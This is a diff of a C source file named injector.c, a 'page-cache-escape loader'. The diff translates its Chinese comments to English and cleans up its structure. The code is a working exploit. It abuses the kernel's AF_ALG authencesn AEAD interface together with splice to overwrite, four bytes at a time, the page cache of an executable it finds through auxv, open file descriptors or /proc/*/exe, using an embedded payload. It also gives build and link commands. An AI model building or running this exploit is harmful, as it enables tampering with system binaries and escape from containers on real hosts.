@@ -1,13 +1,16 @@
 /*
- * injector.c — C 版 page-cache-escape loader
+ * injector.c - page-cache-escape loader
  *
- * 编译: gcc -c -O2 -fPIC -nostdlib -fno-stack-protector -fno-asynchronous-unwind-tables -o rl.o injector.c
- * 链接: ld -N -shared -nostdlib -e _start -o injector.so rl.o
+ * Build: gcc -c -O2 -fPIC -nostdlib -fno-stack-protector -fno-asynchronous-unwind-tables -o rl.o injector.c
+ * Link:  ld -N -shared -nostdlib -e _start -o injector.so rl.o
  *
- * 必须用 -N 链接: 产生单个 RWX LOAD 段，让 Copy Fail 覆写 ld.so page cache 后
- * kernel 能从少量 page 中完整加载 interpreter。标准多段布局会导致代码段加载失败。
+ * The -N linker flag is required. It produces a single RWX LOAD segment so the
+ * kernel can load this interpreter from the small page-cache window overwritten
+ * through Copy Fail. A normal multi-segment layout is more likely to fail while
+ * loading code pages.
  *
- * 约束: 所有函数内变量必须 static（interpreter 模式下栈不可用）
+ * Constraint: keep state in static storage where possible. This code runs in an
+ * unusual interpreter path where normal runtime assumptions are weak.
  */
 
 typedef unsigned long u64;
@@ -55,6 +58,25 @@ static inline long sys6(long nr, long a1, long a2, long a3, long a4, long a5, lo
 #define AT_EXECFD 2
 #define AT_NULL 0
 
+#define PAYLOAD_MAX 4096
+#define CF_AAD_SIZE 8
+#define CF_CBUF_SIZE 128
+#define CF_DRAIN_BUF_SIZE 8192
+#define FD_SCAN_MIN 3
+#define FD_SCAN_MAX 64
+#define TARGET_RETRY_MAX 500
+#define FD_PATH_BUF_SIZE 32
+#define FD_LINK_BUF_SIZE 256
+
+#define ERR_CF_SOCKET -1
+#define ERR_CF_BIND -2
+#define ERR_CF_SET_KEY -3
+#define ERR_CF_ACCEPT -4
+#define ERR_CF_SENDMSG -5
+#define ERR_CF_PIPE -6
+#define ERR_CF_SPLICE_IN -7
+#define ERR_CF_SPLICE_OUT -8
+
 struct sockaddr_alg { u16 family; u8 type[14]; u32 feat; u32 mask; u8 name[64]; };
 struct iovec { void *base; size_t len; };
 struct cmsghdr { size_t len; int level; int type; };
@@ -65,37 +87,64 @@ static void *my_memcpy(void *d, const void *s, size_t n) { u8 *dd=d; const u8 *s
 
 static const u8 key[40] = {0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
 
-// ============ Copy Fail 写原语（全 static 变量）============
+// ============ Copy Fail write primitive backend ============
 
-static struct sockaddr_alg g_sa;
-static u8 g_aad[8];
-static u8 g_cbuf[128];
-static struct iovec g_iov;
-static struct msghdr g_msg;
-static int g_pipefd[2];
-static i64 g_src_off;
-static u8 g_sink[8192];
-static struct iovec g_drain_iov;
-static struct msghdr g_drain_msg;
+static struct sockaddr_alg cf_sa;
+static u8 cf_aad[CF_AAD_SIZE];
+static u8 cf_cbuf[CF_CBUF_SIZE];
+static struct iovec cf_iov;
+static struct msghdr cf_msg;
+static int cf_pipefd[2] = {-1, -1};
+static i64 cf_src_off;
+static u8 cf_sink[CF_DRAIN_BUF_SIZE];
+static struct iovec cf_drain_iov;
+static struct msghdr cf_drain_msg;
 
-static int patch_chunk(int file_fd, i64 offset, u8 four_bytes[4]) {
+static void close_raw_fd(long fd) {
+    if (fd >= 0) sys1(SYS_CLOSE, fd);
+}
+
+static int copyfail_fail(long ctrl, long op, int err) {
+    close_raw_fd(op);
+    close_raw_fd(ctrl);
+    return err;
+}
+
+static int copyfail_pipe_fail(long ctrl, long op, int err) {
+    close_raw_fd(cf_pipefd[0]);
+    close_raw_fd(cf_pipefd[1]);
+    cf_pipefd[0] = -1;
+    cf_pipefd[1] = -1;
+    return copyfail_fail(ctrl, op, err);
+}
+
+static int copyfail_write4(int file_fd, i64 offset, u8 four_bytes[4]) {
+    cf_pipefd[0] = -1;
+    cf_pipefd[1] = -1;
+
     long ctrl = sys3(SYS_SOCKET, AF_ALG, SOCK_SEQPACKET, 0);
-    if (ctrl < 0) return -1;
-    my_memset(&g_sa, 0, sizeof g_sa);
-    g_sa.family = AF_ALG;
-    my_memcpy(g_sa.type, "aead", 5);
-    my_memcpy(g_sa.name, "authencesn(hmac(sha256),cbc(aes))", 34);
-    if (sys3(SYS_BIND, ctrl, (long)&g_sa, sizeof g_sa) < 0) { sys1(SYS_CLOSE,ctrl); return -2; }
-    if (sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_KEY, (long)key, 40) < 0) { sys1(SYS_CLOSE,ctrl); return -3; }
+    if (ctrl < 0) return ERR_CF_SOCKET;
+
+    my_memset(&cf_sa, 0, sizeof cf_sa);
+    cf_sa.family = AF_ALG;
+    my_memcpy(cf_sa.type, "aead", 5);
+    my_memcpy(cf_sa.name, "authencesn(hmac(sha256),cbc(aes))", 34);
+
+    if (sys3(SYS_BIND, ctrl, (long)&cf_sa, sizeof cf_sa) < 0)
+        return copyfail_fail(ctrl, -1, ERR_CF_BIND);
+    if (sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_KEY, (long)key, 40) < 0)
+        return copyfail_fail(ctrl, -1, ERR_CF_SET_KEY);
+
     sys5(SYS_SETSOCKOPT, ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 0, 4);
+
     long op = sys3(SYS_ACCEPT, ctrl, 0, 0);
-    if (op < 0) { sys1(SYS_CLOSE,ctrl); return -4; }
+    if (op < 0) return copyfail_fail(ctrl, -1, ERR_CF_ACCEPT);
 
-    g_aad[0]='A'; g_aad[1]='A'; g_aad[2]='A'; g_aad[3]='A';
-    g_aad[4]=four_bytes[0]; g_aad[5]=four_bytes[1]; g_aad[6]=four_bytes[2]; g_aad[7]=four_bytes[3];
+    cf_aad[0]='A'; cf_aad[1]='A'; cf_aad[2]='A'; cf_aad[3]='A';
+    cf_aad[4]=four_bytes[0]; cf_aad[5]=four_bytes[1]; cf_aad[6]=four_bytes[2]; cf_aad[7]=four_bytes[3];
 
-    my_memset(g_cbuf, 0, sizeof g_cbuf);
-    u8 *p = g_cbuf;
+    my_memset(cf_cbuf, 0, sizeof cf_cbuf);
+    u8 *p = cf_cbuf;
     struct cmsghdr *cm = (struct cmsghdr *)p;
     cm->len = sizeof(struct cmsghdr)+4; cm->level = SOL_ALG; cm->type = ALG_SET_OP;
     *(u32*)(p+sizeof(struct cmsghdr)) = ALG_OP_DECRYPT;
@@ -109,55 +158,74 @@ static int patch_chunk(int file_fd, i64 offset, u8 four_bytes[4]) {
     *(u32*)(p+sizeof(struct cmsghdr)) = 8;
     p += CMSG_ALIGN(cm->len);
 
-    g_iov.base = g_aad; g_iov.len = 8;
-    my_memset(&g_msg, 0, sizeof g_msg);
-    g_msg.iov = &g_iov; g_msg.iovlen = 1;
-    g_msg.control = g_cbuf; g_msg.controllen = (size_t)(p - g_cbuf);
-    if (sys3(SYS_SENDMSG, op, (long)&g_msg, MSG_MORE) < 0) { sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl); return -5; }
+    cf_iov.base = cf_aad; cf_iov.len = 8;
+    my_memset(&cf_msg, 0, sizeof cf_msg);
+    cf_msg.iov = &cf_iov; cf_msg.iovlen = 1;
+    cf_msg.control = cf_cbuf; cf_msg.controllen = (size_t)(p - cf_cbuf);
+    if (sys3(SYS_SENDMSG, op, (long)&cf_msg, MSG_MORE) < 0)
+        return copyfail_fail(ctrl, op, ERR_CF_SENDMSG);
 
-    if (sys1(SYS_PIPE, (long)g_pipefd) < 0) { sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl); return -6; }
-    g_src_off = 0;
-    long n = sys6(SYS_SPLICE, file_fd, (long)&g_src_off, g_pipefd[1], 0, (size_t)offset+4, 0);
-    if (n <= 0) { sys1(SYS_CLOSE,g_pipefd[0]); sys1(SYS_CLOSE,g_pipefd[1]); sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl); return -7; }
+    if (sys1(SYS_PIPE, (long)cf_pipefd) < 0)
+        return copyfail_fail(ctrl, op, ERR_CF_PIPE);
+
+    cf_src_off = 0;
+    long n = sys6(SYS_SPLICE, file_fd, (long)&cf_src_off, cf_pipefd[1], 0, (size_t)offset+4, 0);
+    if (n <= 0)
+        return copyfail_pipe_fail(ctrl, op, ERR_CF_SPLICE_IN);
+
     long rem = n;
-    while (rem > 0) { long w = sys6(SYS_SPLICE, g_pipefd[0], 0, op, 0, rem, 0); if(w<=0){sys1(SYS_CLOSE,g_pipefd[0]);sys1(SYS_CLOSE,g_pipefd[1]);sys1(SYS_CLOSE,op);sys1(SYS_CLOSE,ctrl);return -8;} rem-=w; }
-    // drain: recvmsg + 8192 buffer (buffer 太小内核返回 EMSGSIZE 不执行 AEAD)
-    g_drain_iov.base = g_sink; g_drain_iov.len = 8192;
-    my_memset(&g_drain_msg, 0, sizeof g_drain_msg);
-    g_drain_msg.iov = &g_drain_iov; g_drain_msg.iovlen = 1;
-    sys3(SYS_RECVMSG, op, (long)&g_drain_msg, 0);
+    while (rem > 0) {
+        long w = sys6(SYS_SPLICE, cf_pipefd[0], 0, op, 0, rem, 0);
+        if (w <= 0)
+            return copyfail_pipe_fail(ctrl, op, ERR_CF_SPLICE_OUT);
+        rem -= w;
+    }
 
-    sys1(SYS_CLOSE,g_pipefd[0]); sys1(SYS_CLOSE,g_pipefd[1]);
-    sys1(SYS_CLOSE,op); sys1(SYS_CLOSE,ctrl);
+    // Drain with a large enough buffer; too small can return EMSGSIZE before AEAD runs.
+    cf_drain_iov.base = cf_sink; cf_drain_iov.len = CF_DRAIN_BUF_SIZE;
+    my_memset(&cf_drain_msg, 0, sizeof cf_drain_msg);
+    cf_drain_msg.iov = &cf_drain_iov; cf_drain_msg.iovlen = 1;
+    sys3(SYS_RECVMSG, op, (long)&cf_drain_msg, 0);
+
+    close_raw_fd(cf_pipefd[0]);
+    close_raw_fd(cf_pipefd[1]);
+    close_raw_fd(op);
+    close_raw_fd(ctrl);
     return 0;
 }
 
-// ============ Payload 区域 ============
+// ============ Vulnerability primitive interface ============
+
+static int primitive_write4(int file_fd, i64 offset, u8 four_bytes[4]) {
+    return copyfail_write4(file_fd, offset, four_bytes);
+}
+
+// ============ Payload area ============
 
 static volatile struct __attribute__((packed)) {
     char marker[38];
     u64  len;
-    u8   buf[4096];
+    u8   buf[PAYLOAD_MAX];
 } payload __attribute__((used)) = {
     .marker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01",
     .len = 0,
     .buf = {0},
 };
 
-// ============ 找目标 fd ============
+// ============ Target fd discovery ============
 
-static u8 g_magic[4];
+static u8 target_magic[4];
 static int is_elf(int fd) {
     sys3(SYS_LSEEK, fd, 0, SEEK_SET);
-    if (sys3(SYS_READ, fd, (long)g_magic, 4) != 4) return 0;
-    return g_magic[0]==0x7f && g_magic[1]=='E' && g_magic[2]=='L' && g_magic[3]=='F';
+    if (sys3(SYS_READ, fd, (long)target_magic, 4) != 4) return 0;
+    return target_magic[0]==0x7f && target_magic[1]=='E' && target_magic[2]=='L' && target_magic[3]=='F';
 }
 
-static struct { u64 sec; u64 nsec; } g_delay = {0, 10000000};
+static struct { u64 sec; u64 nsec; } target_retry_delay = {0, 10000000};
 
-// 扫描 fd 3-64 找 ELF
+// Scan fd 3-64 for an already-open ELF.
 static int scan_existing_elf_fd(void) {
-    for (int i = 3; i <= 64; i++) {
+    for (int i = FD_SCAN_MIN; i <= FD_SCAN_MAX; i++) {
         if (sys3(SYS_LSEEK, i, 0, SEEK_SET) >= 0 && is_elf(i))
             return i;
     }
@@ -165,7 +233,7 @@ static int scan_existing_elf_fd(void) {
 }
 
 static int find_target_fd(u64 *auxv) {
-    // 方法 1: AT_EXECFD
+    // Method 1: AT_EXECFD from auxv.
     if (auxv) {
         for (u64 *p = auxv; p[0] != AT_NULL; p += 2) {
             if (p[0] == AT_EXECFD && is_elf((int)p[1]))
@@ -173,14 +241,14 @@ static int find_target_fd(u64 *auxv) {
         }
     }
 
-    // 方法 2: 扫描 fd 3-64
+    // Method 2: scan already-open fds.
     {
         int fd = scan_existing_elf_fd();
         if (fd >= 0) return fd;
     }
 
-    // 方法 3: 重试循环 open /proc/self/exe, /proc/thread-self/exe, /proc/1/exe
-    for (int retry = 0; retry < 500; retry++) {
+    // Method 3: retry procfs exe paths while the runtime is still settling.
+    for (int retry = 0; retry < TARGET_RETRY_MAX; retry++) {
         long fd;
         fd = sys2(SYS_OPEN, (long)"/proc/self/exe", 0);
         if (fd >= 0) {
@@ -197,46 +265,46 @@ static int find_target_fd(u64 *auxv) {
             if (is_elf(fd)) return fd;
             sys1(SYS_CLOSE, fd);
         }
-        // 每次重试也扫一次 fd
+        // Re-scan open fds on every retry.
         {
             int sfd = scan_existing_elf_fd();
             if (sfd >= 0) return sfd;
         }
-        sys2(SYS_NANOSLEEP, (long)&g_delay, 0);
+        sys2(SYS_NANOSLEEP, (long)&target_retry_delay, 0);
     }
     return -1;
 }
 
-// ============ 覆写目标 ============
+// ============ Overwrite engine ============
 
-static u8 g_block[4];
-static u8 g_link_buf[256];
-static int g_read_fd;
+static u8 overwrite_block[4];
+static u8 overwrite_link_buf[FD_LINK_BUF_SIZE];
+static int overwrite_read_fd;
 
 static int overwrite_target(int target_fd) {
     u64 plen = payload.len;
-    if (plen == 0 || plen > 4096) return -1;
+    if (plen == 0 || plen > PAYLOAD_MAX) return -1;
 
-    // readlink /proc/self/fd/<fd> 拿到磁盘路径，再 open 它
-    // splice 从真实磁盘路径的 fd 读取，写入的就是磁盘 page cache
-    g_read_fd = target_fd;
-    static u8 fd_path[32];
+    // Resolve /proc/self/fd/<fd> back to a path and reopen it when possible.
+    // Splicing from the real path fd targets the disk-backed page cache.
+    overwrite_read_fd = target_fd;
+    static u8 fd_path[FD_PATH_BUF_SIZE];
     fd_path[0]='/'; fd_path[1]='p'; fd_path[2]='r'; fd_path[3]='o';
     fd_path[4]='c'; fd_path[5]='/'; fd_path[6]='s'; fd_path[7]='e';
     fd_path[8]='l'; fd_path[9]='f'; fd_path[10]='/'; fd_path[11]='f';
     fd_path[12]='d'; fd_path[13]='/';
-    // 把 target_fd 数字写入路径
+    // Append the target fd number to the path.
     int pos = 14;
     if (target_fd >= 10) fd_path[pos++] = '0' + (target_fd / 10);
     fd_path[pos++] = '0' + (target_fd % 10);
     fd_path[pos] = 0;
 
-    long link_len = sys3(SYS_READLINK, (long)fd_path, (long)g_link_buf, 250);
+    long link_len = sys3(SYS_READLINK, (long)fd_path, (long)overwrite_link_buf, FD_LINK_BUF_SIZE - 1);
     if (link_len > 0) {
-        g_link_buf[link_len] = 0;
-        long alt_fd = sys2(SYS_OPEN, (long)g_link_buf, 0);
+        overwrite_link_buf[link_len] = 0;
+        long alt_fd = sys2(SYS_OPEN, (long)overwrite_link_buf, 0);
         if (alt_fd >= 0 && is_elf(alt_fd)) {
-            g_read_fd = alt_fd;
+            overwrite_read_fd = alt_fd;
         } else if (alt_fd >= 0) {
             sys1(SYS_CLOSE, alt_fd);
         }
@@ -245,48 +313,46 @@ static int overwrite_target(int target_fd) {
     for (u64 i = 0; i < plen; i += 4) {
         u64 chunk = plen - i;
         if (chunk > 4) chunk = 4;
-        my_memcpy(g_block, (const void*)(payload.buf + i), chunk);
+        my_memcpy(overwrite_block, (const void*)(payload.buf + i), chunk);
         if (chunk < 4) {
-            sys3(SYS_LSEEK, g_read_fd, i + chunk, SEEK_SET);
-            sys3(SYS_READ, g_read_fd, (long)(g_block + chunk), 4 - chunk);
+            sys3(SYS_LSEEK, overwrite_read_fd, i + chunk, SEEK_SET);
+            sys3(SYS_READ, overwrite_read_fd, (long)(overwrite_block + chunk), 4 - chunk);
         }
-        if (patch_chunk(g_read_fd, i, g_block) < 0) {
-            if (g_read_fd != target_fd) sys1(SYS_CLOSE, g_read_fd);
+        if (primitive_write4(overwrite_read_fd, i, overwrite_block) < 0) {
+            if (overwrite_read_fd != target_fd) sys1(SYS_CLOSE, overwrite_read_fd);
             sys1(SYS_CLOSE, target_fd);
             return -1;
         }
     }
-    if (g_read_fd != target_fd) sys1(SYS_CLOSE, g_read_fd);
+    if (overwrite_read_fd != target_fd) sys1(SYS_CLOSE, overwrite_read_fd);
     sys1(SYS_CLOSE, target_fd);
     return 0;
 }
 
-// ============ 入口点 ============
+// ============ Entry point ============
 
-static u64 _saved_auxv = 1;
+static u64 *entry_auxv_from_stack(u64 *sp) {
+    u64 argc = sp[0];
+    u64 *p = sp + 1 + argc + 1; // envp[0], after argc + argv + NULL
+    while (*p) p++;
+    return p + 1;
+}
 
-// 纯 asm 解析栈，找到 auxv 指针存入 _saved_auxv，然后跳到 C 函数
+// Keep assembly as a tiny trampoline: preserve the kernel-provided stack
+// pointer, align rsp for C code, then jump to the C entry function.
 __attribute__((naked)) void _start(void) {
     __asm__ volatile(
-        // rsp 指向: argc, argv[0], ..., argv[argc-1], NULL, envp[0], ..., NULL, auxv...
-        "mov (%%rsp), %%rcx\n"             // rcx = argc
-        "lea 16(%%rsp,%%rcx,8), %%rbx\n"   // rbx = &envp[0] (skip argc + argv + NULL)
-        "1: mov (%%rbx), %%rax\n"           // skip envp
-        "add $8, %%rbx\n"
-        "test %%rax, %%rax\n"
-        "jne 1b\n"
-        // rbx 现在指向 auxv
-        "mov %%rbx, %0\n"
+        "mov %%rsp, %%rdi\n"
         "and $-16, %%rsp\n"
         "jmp _start_main\n"
-        : "=m"(_saved_auxv)
         :
-        : "rax", "rbx", "rcx", "memory"
+        :
+        : "rdi", "memory"
     );
 }
 
-__attribute__((used, visibility("hidden"))) void _start_main(void) {
-    u64 *auxv = (u64 *)_saved_auxv;
+__attribute__((used, visibility("hidden"))) void _start_main(u64 *initial_stack) {
+    u64 *auxv = entry_auxv_from_stack(initial_stack);
 
     int fd = find_target_fd(auxv);
     if (fd < 0) sys1(SYS_EXIT, 10);
